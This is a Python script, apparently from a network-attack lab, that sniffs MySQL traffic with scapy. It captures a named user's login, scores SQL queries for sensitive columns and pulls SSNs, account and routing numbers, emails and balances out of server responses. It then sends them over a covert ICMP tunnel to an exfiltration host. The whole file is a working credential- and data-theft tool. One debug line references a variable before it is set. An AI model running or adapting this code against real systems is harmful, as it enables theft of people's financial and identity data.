#!/usr/bin/env python3
# capture_creds.py - Enhanced MySQL packet capture and exfiltration
from scapy.all import *
import struct
import re
from datetime import datetime
import hashlib

class MySQLExfiltrator:
    def __init__(self, exfil_ip="172.20.0.40"):
        self.exfil_ip = exfil_ip
        self.captured_creds = False
        self.session_data = {}
        self.packets_processed = 0
        self.valuable_data_found = 0
        
        # Sensitive column patterns to look for
        self.sensitive_columns = [
            'ssn', 'social_security', 'tax_id',
            'account_number', 'routing_number', 
            'credit_card', 'cvv', 'pin',
            'password', 'pwd', 'secret',
            'balance', 'credit_limit', 'salary',
            'client_name', 'customer_name', 'full_name',
            'email', 'phone', 'address',
            'wire_transfer', 'iban', 'swift'
        ]
        
        # High-value data patterns
        self.data_patterns = {
            'ssn': re.compile(rb'\d{3}-\d{2}-\d{4}'),
            'routing': re.compile(rb'\d{9}'),
            'account': re.compile(rb'\d{10,17}'),
            'money': re.compile(rb'\$?[\d,]+\.\d{2}'),
            'large_numbers': re.compile(rb'\d{6,}'),  # 6+ digit numbers (balances)
            'email': re.compile(rb'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
            'symbols': re.compile(rb'\b[A-Z]{2,5}\b')  # Stock symbols
        }
        
    #Extract and process mysql tcp packets
    def extract_mysql_data(self, packet):
        if not packet.haslayer(Raw):
            print("[DEBUG] No Raw layer, skipping")
            return
            
        self.packets_processed += 1
        
        try:
            tcp_layer = packet[TCP]
            ip_layer = packet[IP]

            src_ip = ip_layer.src
            dst_ip = ip_layer.dst
            src_port = tcp_layer.sport
            dst_port = tcp_layer.dport
            
            key = tuple(sorted([(src_ip, src_port), (dst_ip, dst_port)]))
            
            if key not in self.session_data.keys():
                self.session_data[key] = bytearray()

            self.session_data[key].extend(packet[Raw].load)
            print(f"[DEBUG] Raw payload length: {len(payload)}")

            session_buffer = self.session_data[key]
            print(packet, session_buffer, self.packets_processed)
            while len(session_buffer) >= 4:
                #extract complete payload and length
                payload_len = int.from_bytes(session_buffer[0:3], byteorder='little')
                #check for complete mysql packet
                if len(session_buffer) < 4 + payload_len:
                    break

                payload = session_buffer[4:4+payload_len]

                # Determine packet direction
                if dst_ip == "172.20.0.10":  # To MySQL server
                    self.handle_client_packet(payload, src_ip)
                elif src_ip == "172.20.0.10":  # From MySQL server
                    self.handle_server_packet(payload, dst_ip)

                #remove processed payload.
                session_buffer = session_buffer[4+payload_len:]
                self.session_data[key] = session_buffer
                
            # Print statistics every 50 packets
            if self.packets_processed % 50 == 0:
                print(f"[STATS] Packets: {self.packets_processed}, Valuable finds: {self.valuable_data_found}")
                
        except Exception as e:
            pass  # Continue processing
    
    def handle_client_packet(self, payload, client_ip):
        """Process packets from client to server"""
        
        # Check for authentication
        if b"sarah_chen" in payload and not self.captured_creds:
            self.extract_credentials(payload, client_ip)
        
        # Check for SQL queries
        if self.is_query_packet(payload):
            query = self.extract_query(payload)
            if query:
                # Determine query sensitivity
                sensitivity = self.assess_query_sensitivity(query)
                if sensitivity > 0:
                    print(f"[QUERY] Sensitivity: {'HIGH' if sensitivity > 5 else 'MEDIUM'}")
                    self.exfiltrate_query(query, client_ip, sensitivity)
    
    def handle_server_packet(self, payload, client_ip):
        """Process response packets from server"""
        
        # Look for valuable data in responses
        valuable_data = self.extract_valuable_data(payload)
        
        if valuable_data:
            self.valuable_data_found += 1
            print(f"[DATA FOUND] {len(valuable_data)} valuable items detected")
            self.exfiltrate_data(valuable_data, client_ip)
    
    def extract_credentials(self, payload, client_ip):
        """Extract MySQL authentication credentials"""
        print(f"[CREDS] MySQL authentication captured from {client_ip}")
        
        # MySQL auth packet structure contains username and password hash
        creds_info = {
            'timestamp': datetime.now().isoformat(),
            'client_ip': client_ip,
            'username': 'sarah_chen',
            'auth_type': 'mysql_native_password'
        }
        
        # Create a hash of the packet for tracking
        packet_hash = hashlib.md5(payload).hexdigest()[:8]
        creds_data = f"CREDS|{packet_hash}|{creds_info}"
        
        self.exfiltrate_via_icmp(str(creds_data).encode())
        self.captured_creds = True
    
    def extract_query(self, payload):
        """Extract SQL query from packet"""
        if len(payload) > 5 and payload[4] == 0x03:  # COM_QUERY
            query = payload[5:].decode('utf-8', errors='ignore')
            return query.strip()
        return None
    
    def assess_query_sensitivity(self, query):
        """Score query based on sensitive keywords"""
        score = 0
        query_lower = query.lower()
        
        # Check for sensitive columns
        for col in self.sensitive_columns:
            if col in query_lower:
                score += 3
        
        # Check for sensitive tables
        sensitive_tables = ['wire_transfers', 'accounts', 'ssn', 'credit']
        for table in sensitive_tables:
            if table in query_lower:
                score += 2
        
        # Check for data extraction commands
        if 'select' in query_lower:
            score += 1
            if '*' in query:  # SELECT * is more sensitive
                score += 2
        
        return score
    
    def extract_valuable_data(self, payload):
        """Extract valuable data from server responses"""
        findings = {}
        
        # Check each pattern type
        for pattern_name, pattern in self.data_patterns.items():
            matches = pattern.findall(payload)
            if matches:
                # Decode and clean matches
                clean_matches = []
                for match in matches[:10]:  # Limit to 10 per type
                    try:
                        decoded = match.decode('utf-8', errors='ignore')
                        clean_matches.append(decoded)
                    except:
                        clean_matches.append(str(match))
                
                if clean_matches:
                    findings[pattern_name] = clean_matches
        
        # Also check for sensitive column names in response
        for col in self.sensitive_columns:
            if col.encode() in payload.lower():
                findings['schema_leak'] = findings.get('schema_leak', []) + [col]
        
        return findings if findings else None
    
    def exfiltrate_query(self, query, client_ip, sensitivity):
        """Exfiltrate captured SQL query"""
        # Truncate long queries but keep the important parts
        if len(query) > 200:
            query = query[:200] + "..."
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        exfil_data = f"QUERY|{timestamp}|{client_ip}|SENS:{sensitivity}|{query}"
        self.exfiltrate_via_icmp(exfil_data.encode())
    
    def exfiltrate_data(self, valuable_data, client_ip):
        """Exfiltrate extracted valuable data"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Summarize findings
        summary = []
        for dtype, values in valuable_data.items():
            summary.append(f"{dtype}:{len(values)}")
            # Send actual values for high-value types
            if dtype in ['ssn', 'account', 'routing']:
                for value in values[:3]:  # First 3 values
                    detail = f"DATA|{timestamp}|{client_ip}|{dtype}|{value}"
                    self.exfiltrate_via_icmp(detail.encode())
        
        # Send summary
        summary_data = f"SUMMARY|{timestamp}|{client_ip}|" + ",".join(summary)
        self.exfiltrate_via_icmp(summary_data.encode())
    
    def exfiltrate_via_icmp(self, data):
        """Send data via ICMP to exfil server"""
        max_chunk = 1400
        
        for i in range(0, len(data), max_chunk):
            chunk = data[i:i+max_chunk]
            # Add sequence number for reconstruction
            seq_num = i // max_chunk
            icmp_packet = IP(dst=self.exfil_ip)/ICMP(id=seq_num)/chunk
            send(icmp_packet, verbose=0)
        
        print(f"[EXFIL→] {len(data)} bytes sent to {self.exfil_ip}")

# ASCII art banner
banner = """
╔══════════════════════════════════════════╗
║  MySQL Credential & Data Exfiltrator     ║
║  Project: ARP Spoof + ICMP Tunnel        ║
╚══════════════════════════════════════════╝
"""

print(banner)
print(f"[*] Starting at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"[*] Target: MySQL traffic on port 3306")
print(f"[*] Exfil destination: 172.20.0.40 (ICMP)")
print("[*] Sensitive patterns loaded:", len(MySQLExfiltrator().sensitive_columns), "columns")
print("-" * 50)

# Start capture
exfiltrator = MySQLExfiltrator()
try:
    sniff(filter="port 3306", prn=exfiltrator.extract_mysql_data, store=0)
except KeyboardInterrupt:
    print(f"\n[*] Capture ended. Total packets: {exfiltrator.packets_processed}")
    print(f"[*] Valuable data found: {exfiltrator.valuable_data_found}")